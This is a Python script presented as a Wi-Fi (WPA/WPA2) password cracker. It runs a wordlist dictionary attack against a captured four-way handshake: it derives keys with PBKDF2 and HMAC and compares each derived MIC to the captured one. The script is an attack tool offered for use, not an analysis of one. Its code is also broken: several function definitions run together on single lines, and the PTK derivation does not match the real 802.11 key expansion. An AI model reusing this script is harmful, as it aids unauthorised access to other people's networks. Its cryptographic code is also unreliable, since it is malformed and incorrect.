import hashlib
import hmac
import binascii
import os

def pbkdf2_hmac_sha1(password, ssid, iterations, dklen=32):
   
    """
    Key derivation function (PBKDF2) with HMAC-SHA1 as the PRF, 
    used to generate the Pairwise Master Key (PMK).
    """
    return hashlib.pbkdf2_hmac('sha1', password.encode(), ssid.encode(), iterations, dklen)def calculate_ptk(pmk, a_nonce, s_nonce, ap_mac, client_mac):
   
    """
    Calculate the Pairwise Transient Key (PTK) by combining the 
    PMK with the handshake parameters (nonces, MAC addresses).
    """
    b = min(ap_mac, client_mac) + max(ap_mac, client_mac) + min(a_nonce, s_nonce) + max(a_nonce, s_nonce)
    return hmac.new(pmk, b, hashlib.sha1).digest()def verify_password(pmk, ptk, eapol_msg, mic):
      
    """
    Verify if the calculated MIC (Message Integrity Code) matches the actual MIC from the handshake.
    """
    calculated_mic = hmac.new(ptk[:16], eapol_msg, hashlib.sha1).hexdigest()
    return calculated_mic == micdef crack_wifi_password(ssid, wordlist_file, a_nonce, s_nonce, ap_mac, client_mac, eapol_msg, mic):
   
    """
    Attempt to crack the Wi-Fi password by iterating through the wordlist and checking each password.
    """
    with open(wordlist_file, 'r') as wordlist:
        for password in wordlist:
            password = password.strip()
            print(f"Trying password: {password}")
            pmk = pbkdf2_hmac_sha1(password, ssid, 4096)
            ptk = calculate_ptk(pmk, a_nonce, s_nonce, ap_mac, client_mac)
          
            if verify_password(pmk, ptk, eapol_msg, mic):
                print(f"Password found: {password}")
                return password
              
    print("Password not found.")
    return None# Replace these with actual values from the captured handshake


ssid = "YourSSID"
wordlist_file = "rockyou.txt"
a_nonce = binascii.unhexlify("Nonce from AP")
s_nonce = binascii.unhexlify("Nonce from client")
ap_mac = binascii.unhexlify("MAC address of AP")
client_mac = binascii.unhexlify("MAC address of client")
eapol_msg = binascii.unhexlify("EAPOL message")
mic = "MIC from handshake"cracked_password = crack_wifi_password(ssid, wordlist_file, a_nonce, s_nonce, ap_mac, client_mac, eapol_msg, mic)

if cracked_password:
    print(f"Successfully cracked the password: {cracked_password}")
else:
    print("Failed to crack the password.")
  
